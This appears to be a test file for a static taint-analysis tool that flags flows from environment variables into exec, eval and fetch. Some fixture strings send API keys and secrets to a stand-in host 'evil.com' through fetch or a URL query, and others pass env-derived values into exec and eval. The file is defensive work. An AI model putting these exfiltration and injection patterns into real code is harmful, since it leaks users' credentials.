/**
 * Tests for dataflow/taint analysis
 *
 * Phase 3.1: Dataflow Implementation
 */

import { describe, it, expect } from 'vitest';
import * as ts from 'typescript';
import { buildDataFlowGraph } from './dataflow-graph.js';
import {
  propagateTaint,
  findTaintPaths,
  extractTaintSources,
  extractTaintSinks,
} from './taint-propagation.js';

describe('Dataflow Graph Construction', () => {
  it('should detect process.env as taint source', () => {
    const code = `
      const apiKey = process.env.API_KEY;
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    expect(sources.length).toBeGreaterThan(0);
    expect(sources[0].type).toBe('env-var');
  });

  it('should detect exec as taint sink', () => {
    const code = `
      import { exec } from 'child_process';
      exec('ls');
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sinks = extractTaintSinks(graph);
    expect(sinks.length).toBeGreaterThan(0);
    expect(sinks[0].type).toBe('command-execution');
  });

  it('should detect eval as taint sink', () => {
    const code = `
      eval('console.log("test")');
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sinks = extractTaintSinks(graph);
    expect(sinks.length).toBeGreaterThan(0);
    expect(sinks[0].type).toBe('code-evaluation');
  });

  it('should detect fetch as taint sink', () => {
    const code = `
      fetch('https://example.com', { method: 'POST', body: data });
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sinks = extractTaintSinks(graph);
    expect(sinks.length).toBeGreaterThan(0);
    expect(sinks[0].type).toBe('network-request');
  });

  it('should create dataflow edge for assignment', () => {
    const code = `
      const a = process.env.KEY;
      const b = a;
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    expect(graph.edges.length).toBeGreaterThan(0);
    expect(graph.edges.some((e) => e.type === 'assignment')).toBe(true);
  });
});

describe('Taint Propagation', () => {
  it('should propagate taint through direct assignment', () => {
    const code = `
      const secret = process.env.SECRET;
      const copy = secret;
      exec(copy);
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const tainted = propagateTaint(graph, sources);

    // Should have at least 3 tainted nodes: source, secret, copy
    expect(tainted.size).toBeGreaterThanOrEqual(2);
  });

  it('should propagate taint through assignment chain', () => {
    const code = `
      const a = process.env.KEY;
      const b = a;
      const c = b;
      exec(c);
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const tainted = propagateTaint(graph, sources);

    // Should have at least 4 tainted nodes: source, a, b, c
    expect(tainted.size).toBeGreaterThanOrEqual(3);
  });

  it('should propagate taint through property assignment', () => {
    const code = `
      const config = {};
      config.apiKey = process.env.KEY;
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const tainted = propagateTaint(graph, sources);

    expect(tainted.size).toBeGreaterThan(0);
  });

  it('should propagate taint through template literals', () => {
    const code = `
      const key = process.env.KEY;
      const url = \`https://evil.com?key=\${key}\`;
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const tainted = propagateTaint(graph, sources);

    expect(tainted.size).toBeGreaterThan(0);
  });

  it('should propagate taint through object construction', () => {
    const code = `
      const secret = process.env.TOKEN;
      const obj = { key: secret };
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const tainted = propagateTaint(graph, sources);

    expect(tainted.size).toBeGreaterThan(0);
  });
});

describe('Taint Path Detection', () => {
  it('should detect direct taint flow: env var → exec', () => {
    const code = `
      const cmd = process.env.COMMAND;
      exec(cmd);
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const sinks = extractTaintSinks(graph);
    const tainted = propagateTaint(graph, sources);
    const paths = findTaintPaths(graph, sources, sinks, tainted);

    expect(paths.length).toBeGreaterThan(0);
    expect(paths[0].severity).toBe('CRITICAL');
  });

  it('should detect taint flow: env var → eval', () => {
    const code = `
      const code = process.env.CODE;
      eval(code);
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const sinks = extractTaintSinks(graph);
    const tainted = propagateTaint(graph, sources);
    const paths = findTaintPaths(graph, sources, sinks, tainted);

    expect(paths.length).toBeGreaterThan(0);
    expect(paths[0].severity).toBe('CRITICAL');
  });

  it('should detect taint flow: env var → fetch (exfiltration)', () => {
    const code = `
      const apiKey = process.env.API_KEY;
      fetch('https://evil.com', { body: apiKey });
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const sinks = extractTaintSinks(graph);
    const tainted = propagateTaint(graph, sources);
    const paths = findTaintPaths(graph, sources, sinks, tainted);

    expect(paths.length).toBeGreaterThan(0);
    expect(paths[0].severity).toBe('CRITICAL');
  });

  it('should detect multi-step taint flow', () => {
    const code = `
      const secret = process.env.SECRET;
      const config = { key: secret };
      const data = config.key;
      fetch('https://evil.com', { body: data });
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const sinks = extractTaintSinks(graph);
    const tainted = propagateTaint(graph, sources);
    const paths = findTaintPaths(graph, sources, sinks, tainted);

    expect(paths.length).toBeGreaterThan(0);
    expect(paths[0].path.length).toBeGreaterThan(2); // Multi-step
  });

  it('should calculate high confidence for short paths', () => {
    const code = `
      const key = process.env.KEY;
      exec(key);
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const sinks = extractTaintSinks(graph);
    const tainted = propagateTaint(graph, sources);
    const paths = findTaintPaths(graph, sources, sinks, tainted);

    expect(paths.length).toBeGreaterThan(0);
    expect(paths[0].confidence).toBe('high');
  });

  it('should not detect paths when sink is not reachable', () => {
    const code = `
      const safe = 'safe-value';
      const dangerous = process.env.KEY;
      exec(safe);
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const sinks = extractTaintSinks(graph);
    const tainted = propagateTaint(graph, sources);
    const paths = findTaintPaths(graph, sources, sinks, tainted);

    // Should not find path since exec uses 'safe', not 'dangerous'
    expect(paths.length).toBe(0);
  });
});

describe('Edge Cases', () => {
  it('should handle code with no sources', () => {
    const code = `
      const safe = 'safe';
      exec(safe);
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    expect(sources.length).toBe(0);
  });

  it('should handle code with no sinks', () => {
    const code = `
      const apiKey = process.env.API_KEY;
      console.log('Using key');
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sinks = extractTaintSinks(graph);
    expect(sinks.length).toBe(0);
  });

  it('should handle empty code', () => {
    const code = ``;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    expect(graph.nodes.length).toBe(0);
    expect(graph.edges.length).toBe(0);
  });

  it('should handle multiple sources and sinks', () => {
    const code = `
      const key1 = process.env.KEY1;
      const key2 = process.env.KEY2;
      exec(key1);
      eval(key2);
    `;

    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const graph = buildDataFlowGraph(sourceFile);

    const sources = extractTaintSources(graph);
    const sinks = extractTaintSinks(graph);

    expect(sources.length).toBeGreaterThanOrEqual(2);
    expect(sinks.length).toBeGreaterThanOrEqual(2);
  });
});
